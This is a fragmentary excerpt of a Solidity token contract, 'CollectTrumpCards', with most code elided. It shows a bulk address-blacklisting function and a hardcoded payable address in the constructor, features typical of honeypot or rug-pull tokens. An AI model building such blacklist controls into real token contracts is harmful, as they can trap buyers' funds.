...
contract CollectTrumpCards is Context, IERC20, Ownable{
    ...
    string private _name = "CollectTrumpCards.com";
    ...
    function multiBlack(address[] calldata addresses,bool status) public {
    ...
    constructor () {
        ...
        PAYABLE0x = payable(address(0xC6E655a5D67fd8335D6d1667E8ED249c3673b72B));
